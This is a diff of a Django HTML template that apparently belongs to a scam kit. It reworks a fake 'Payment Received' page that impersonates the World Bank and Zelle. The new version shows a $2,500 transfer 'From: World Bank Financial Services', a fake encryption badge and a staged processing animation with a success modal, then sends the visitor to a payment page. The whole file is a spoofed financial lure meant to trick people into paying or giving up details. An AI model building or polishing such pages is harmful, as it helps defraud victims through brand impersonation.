@@ -1,147 +1,313 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
-
-<title>Worldbank</title>
-<link rel="icon" href="https://i.postimg.cc/8P7NLtNC/worldbank-icon-modified.png" type="image/png" sizes="80x80">
-<style>
-    body {
-        font-family: Arial, sans-serif;
-        text-align: center;
-        background-color: #fff;
-    }
-    .container {
-        max-width: 600px;
-        margin: 50px auto;
-        padding: 20px;
-        background-color: #fff;
-        border-radius: 5px;
-    }
-    .success-image {
-        max-width: 50%;
-        margin-left: 13px;
-        height: 50%;
-    }
-
-    .success-image1 {
-        max-width: 50%;
-        margin-left: -4px;
-        margin-top: 120px;
-        height: 35%;
-    }
-
-    .message {
-        margin-top: 50px;
-        font-size: 24px;
-        font-family: verdana;
-        color: #333;
-    }
-
-
-    .message1 {
-        margin-top: 10px;
-        font-size: 24px;
-        font-family: verdana;
-        font-weight: 900;
-        color: #333;
-        margin-left: -8px;
-
-    }
-
-
-
-    .message2 {
-        margin-top: 55px;
-        font-size: 14px;
-        font-family: verdana;
-        font-weight: 500;
-        color: #333;
-    }
-
-
-    .message3 {
-        margin-top: 40px;
-        font-size: 14px;
-        font-family: verdana;
-        font-weight: 300;
-        color: #333;
-    }
-
-
-    .message4 {
-        margin-top:5px;
-        font-size: 13px;
-        font-family: verdana;
-        color: #6a0dad;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zelle Payment | World Bank</title>
+    <link rel="icon" href="https://i.postimg.cc/8P7NLtNC/worldbank-icon-modified.png" type="image/png" sizes="80x80">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+        }
         
-    }
-    
-    .button {
-        display: inline-block;
-        margin-top: 25px;
-        padding: 10px 60px;
-        background-color: #6a0dad;
-        color: #fff;
-        text-decoration: none;
-        border-radius: 5px;
-    }
-
-
-
-
-.content {
-    height: 100vh; /* Set the height of the content to fill the viewport */
-    padding: 20px;
-}
-
-footer.transparent-footer {
-    position: fixed;
-    bottom: 0;
-    left: 0;
-    width: 100%;
-    background-color: rgba(0, 0, 0, 0.2); /* Set the background color with 50% opacity */
-    text-align: center;
-}
-
-footer.transparent-footer img {
-    max-width: 100%;
-    height: auto;
-    display: block;
-    margin: 0 auto;
-}
-</style>
+        .gradient-bg {
+            background: linear-gradient(135deg, #6d28d9 0%, #4c1d95 100%);
+        }
+        
+        .card-glow {
+            box-shadow: 0 10px 30px -5px rgba(0, 0, 0, 0.3);
+        }
+        
+        .pulse-animation {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(109, 40, 217, 0.4);
+            }
+            70% {
+                box-shadow: 0 0 0 10px rgba(109, 40, 217, 0);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(109, 40, 217, 0);
+            }
+        }
+        
+        .slide-in {
+            animation: slideIn 0.5s ease-out;
+        }
+        
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .floating {
+            animation: floating 3s ease-in-out infinite;
+        }
+        
+        @keyframes floating {
+            0% { transform: translate(0, 0px); }
+            50% { transform: translate(0, -10px); }
+            100% { transform: translate(0, 0px); }
+        }
+    </style>
 </head>
-<body>
-<div class="container">
-    {% for my_transfer in my_transfers %}
+<body class="gradient-bg min-h-screen flex items-center justify-center p-4">
+    <!-- Animated Background Elements -->
+    <div class="fixed inset-0 overflow-hidden pointer-events-none">
+        <div class="absolute top-1/4 left-1/4 w-20 h-20 bg-purple-300 rounded-full opacity-10 floating"></div>
+        <div class="absolute top-3/4 right-1/4 w-16 h-16 bg-indigo-300 rounded-full opacity-10 floating" style="animation-delay: 1s;"></div>
+        <div class="absolute bottom-1/4 left-1/3 w-24 h-24 bg-pink-300 rounded-full opacity-10 floating" style="animation-delay: 2s;"></div>
+    </div>
 
-    <img src="{{ my_transfer.image.url }}" alt="Success Image" class="success-image1 w3-hide-medium w3-hide-large">
+    <!-- Main Content -->
+    <div class="relative z-10 w-full max-w-2xl">
+        <!-- Header -->
+        <div class="text-center mb-8 slide-in">
+            <div class="flex justify-center items-center mb-6">
+                <img src="https://i.postimg.cc/8P7NLtNC/worldbank-icon-modified.png" alt="World Bank Logo" class="h-16 rounded-full">
+            </div>
+            <h1 class="text-3xl md:text-4xl font-bold text-white mb-2">Secure Money Transfer</h1>
+            <p class="text-xl text-purple-200 font-medium">You've received a payment</p>
+        </div>
 
-    <img src="{{ my_transfer.image.url }}" alt="Success Image" class="success-image w3-hide-small">
+        <!-- Payment Card -->
+        <div class="bg-white rounded-2xl card-glow overflow-hidden slide-in" style="animation-delay: 0.2s;">
+            <!-- Card Header -->
+            <div class="bg-gradient-to-r from-purple-600 to-indigo-700 p-6 text-white">
+                <div class="flex justify-between items-center">
+                    <div>
+                        <h2 class="text-2xl font-bold">Payment Received</h2>
+                        <p class="text-purple-200">From: <span id="senderName">World Bank Financial Services</span></p>
+                    </div>
+                    <div class="bg-white bg-opacity-20 p-3 rounded-full">
+                        <i class="fas fa-shield-alt text-2xl"></i>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Card Content -->
+            <div class="p-6 md:p-8">
+                <!-- Amount Display -->
+                <div class="text-center mb-8">
+                    <div class="inline-flex items-center justify-center bg-green-50 rounded-full p-4 mb-4">
+                        <i class="fas fa-money-bill-wave text-green-500 text-2xl mr-3"></i>
+                        <span id="amountDisplay" class="text-3xl font-bold text-green-700">$2,500.00</span>
+                    </div>
+                    <p class="text-gray-600">Available for immediate transfer to your account</p>
+                </div>
+                
+                <!-- Payment Details -->
+                <div class="bg-gray-50 rounded-xl p-5 mb-6 border border-gray-200">
+                    <h3 class="font-bold text-gray-800 mb-4 flex items-center">
+                        <i class="fas fa-info-circle text-purple-500 mr-2"></i>
+                        Payment Details
+                    </h3>
+                    <div class="space-y-3">
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Sender:</span>
+                            <span id="senderDetail" class="font-semibold">World Bank Financial Dept.</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Transaction ID:</span>
+                            <span id="transactionId" class="font-semibold">WBZ783920174</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Date:</span>
+                            <span id="transactionDate" class="font-semibold">Oct 15, 2023</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Status:</span>
+                            <span class="font-semibold text-green-600">Completed</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Security Badge -->
+                <div class="flex items-center justify-center bg-blue-50 rounded-lg p-4 mb-6 border border-blue-200">
+                    <i class="fas fa-lock text-blue-500 text-xl mr-3"></i>
+                    <span class="text-blue-700 font-medium">Secured by Zelle® & World Bank Encryption</span>
+                </div>
+                
+                <!-- Action Buttons -->
+                <div class="flex flex-col md:flex-row gap-4">
+                    <button id="acceptBtn" class="flex-1 bg-gradient-to-r from-green-500 to-emerald-600 text-white font-bold py-4 px-6 rounded-xl shadow-lg pulse-animation transform transition-all duration-300 hover:scale-105 flex items-center justify-center">
+                        <i class="fas fa-check-circle mr-2"></i>
+                        ACCEPT PAYMENT
+                    </button>
+                    <button class="flex-1 bg-gray-200 text-gray-800 font-bold py-4 px-6 rounded-xl transform transition-all duration-300 hover:bg-gray-300 flex items-center justify-center">
+                        <i class="fas fa-times-circle mr-2"></i>
+                        DECLINE
+                    </button>
+                </div>
+                
+                <!-- Additional Info -->
+                <div class="mt-6 text-center text-gray-500 text-sm">
+                    <p>By accepting, you agree to our <a href="#" class="text-purple-600 hover:underline">Terms of Service</a> and <a href="#" class="text-purple-600 hover:underline">Privacy Policy</a></p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Security Features -->
+        <div class="mt-8 grid grid-cols-1 md:grid-cols-3 gap-4 text-center slide-in" style="animation-delay: 0.4s;">
+            <div class="bg-white bg-opacity-10 rounded-xl p-4 text-white">
+                <i class="fas fa-user-shield text-2xl mb-2"></i>
+                <h3 class="font-bold">Identity Verification</h3>
+                <p class="text-sm text-purple-200">Secure user authentication</p>
+            </div>
+            <div class="bg-white bg-opacity-10 rounded-xl p-4 text-white">
+                <i class="fas fa-bolt text-2xl mb-2"></i>
+                <h3 class="font-bold">Instant Transfer</h3>
+                <p class="text-sm text-purple-200">Money moves in minutes</p>
+            </div>
+            <div class="bg-white bg-opacity-10 rounded-xl p-4 text-white">
+                <i class="fas fa-headset text-2xl mb-2"></i>
+                <h3 class="font-bold">24/7 Support</h3>
+                <p class="text-sm text-purple-200">Help when you need it</p>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="text-center mt-8 text-white text-sm slide-in" style="animation-delay: 0.6s;">
+            <p>© 2023 World Bank & Zelle. All rights reserved.</p>
+        </div>
+    </div>
 
-    <div class="message">{{ my_transfer.message1 }}</div>
+    <!-- Processing Modal -->
+    <div id="processingModal" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden">
+        <div class="bg-white rounded-2xl shadow-2xl max-w-md w-full mx-4 transform transition-all duration-300 scale-95">
+            <div class="p-8 text-center">
+                <!-- Animated Spinner -->
+                <div class="w-20 h-20 border-4 border-purple-200 border-t-purple-600 rounded-full animate-spin mx-auto mb-6"></div>
+                
+                <h3 class="text-2xl font-bold text-gray-800 mb-2">Processing Payment</h3>
+                <p class="text-gray-600 mb-6">Please wait while we securely transfer your funds...</p>
+                
+                <!-- Progress Bar -->
+                <div class="w-full bg-gray-200 rounded-full h-2 mb-6">
+                    <div id="progressBar" class="bg-gradient-to-r from-purple-500 to-indigo-600 h-2 rounded-full w-0 transition-all duration-500"></div>
+                </div>
+                
+                <p class="text-sm text-gray-500">This usually takes less than 30 seconds</p>
+            </div>
+        </div>
+    </div>
 
+    <!-- Success Modal -->
+    <div id="successModal" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden">
+        <div class="bg-white rounded-2xl shadow-2xl max-w-md w-full mx-4 transform transition-all duration-300 scale-95">
+            <div class="p-8 text-center">
+                <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                    <i class="fas fa-check text-green-500 text-3xl"></i>
+                </div>
+                
+                <h3 class="text-2xl font-bold text-gray-800 mb-2">Payment Accepted!</h3>
+                <p id="successAmountMessage" class="text-gray-600 mb-6">$2,500.00 has been successfully transferred to your account.</p>
+                
+                <div class="bg-green-50 rounded-lg p-4 mb-6 text-left">
+                    <div class="flex justify-between mb-2">
+                        <span class="text-gray-600">Transaction ID:</span>
+                        <span id="successTransactionId" class="font-semibold">WBZ783920174</span>
+                    </div>
+                    <div class="flex justify-between mb-2">
+                        <span class="text-gray-600">Amount:</span>
+                        <span id="successAmount" class="font-semibold">$2,500.00</span>
+                    </div>
+                    <div class="flex justify-between">
+                        <span class="text-gray-600">Status:</span>
+                        <span class="font-semibold text-green-600">Completed</span>
+                    </div>
+                </div>
+                
+                <button id="closeSuccess" class="w-full bg-gradient-to-r from-green-500 to-emerald-600 text-white font-bold py-4 px-6 rounded-xl hover:scale-105 transition-transform">
+                    Continue to Account
+                </button>
+            </div>
+        </div>
+    </div>
 
-    <div class="message1">＄{{ my_transfer.amount }}</div>
-
-    <a href="{% url 'payment' %}" class="button">ACCEPT MONEY</a>
-
-    <div class="message2">{{ my_transfer.message2 }}</div>
-
-     <div class="message3">{{ my_transfer.message3 }}</div>
-
-     <div class="message4">{{ my_transfer.message4 }}</div>
-
-
-     {% comment %} <footer class="transparent-footer">
-        <img src="{{ my_transfer.image.url }}" height="" width="50px"  alt="Footer Image">
-    </footer> {% endcomment %}
-    {% endfor %}
-
-</div>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Get modal elements
+            const processingModal = document.getElementById('processingModal');
+            const successModal = document.getElementById('successModal');
+            const progressBar = document.getElementById('progressBar');
+            
+            // Get button elements
+            const acceptBtn = document.getElementById('acceptBtn');
+            const closeSuccess = document.getElementById('closeSuccess');
+            
+            // Get data display elements
+            const amountDisplay = document.getElementById('amountDisplay');
+            const senderDetail = document.getElementById('senderDetail');
+            const transactionId = document.getElementById('transactionId');
+            const transactionDate = document.getElementById('transactionDate');
+            const successAmountMessage = document.getElementById('successAmountMessage');
+            const successTransactionId = document.getElementById('successTransactionId');
+            const successAmount = document.getElementById('successAmount');
+            
+            // In a real application, these values would come from your Django template
+            // For demonstration, we're setting them directly
+            // Replace these with your actual template variables
+            
+            // Set dynamic data from Django template variables
+            // amountDisplay.textContent = `＄{{ my_transfer.amount }}`;
+            // senderDetail.textContent = `{{ my_transfer.message2 }}`;
+            // transactionId.textContent = `{{ my_transfer.message3 }}`;
+            // transactionDate.textContent = `{{ my_transfer.message4 }}`;
+            
+            // For demo purposes, setting example values
+            amountDisplay.textContent = `＄2,500.00`;
+            senderDetail.textContent = `World Bank Financial Department`;
+            transactionId.textContent = `WBZ783920174`;
+            transactionDate.textContent = `Oct 15, 2023`;
+            
+            // Set success modal data
+            successAmountMessage.textContent = `${amountDisplay.textContent} has been successfully transferred to your account.`;
+            successTransactionId.textContent = transactionId.textContent;
+            successAmount.textContent = amountDisplay.textContent;
+            
+            // Handle Accept Payment button click
+            acceptBtn.addEventListener('click', function() {
+                // Show processing modal
+                processingModal.classList.remove('hidden');
+                
+                // Simulate processing with progress bar
+                let progress = 0;
+                const interval = setInterval(() => {
+                    progress += 5;
+                    progressBar.style.width = `${progress}%`;
+                    
+                    if (progress >= 100) {
+                        clearInterval(interval);
+                        
+                        // Hide processing modal and show success modal after a short delay
+                        setTimeout(() => {
+                            processingModal.classList.add('hidden');
+                            successModal.classList.remove('hidden');
+                        }, 500);
+                    }
+                }, 150);
+            });
+            
+            // Close success modal and redirect to payment page
+            closeSuccess.addEventListener('click', function() {
+                successModal.classList.add('hidden');
+                // Redirect to payment page
+                window.location.href = "{% url 'payment' %}";
+            });
+        });
+    </script>
 </body>
 </html>
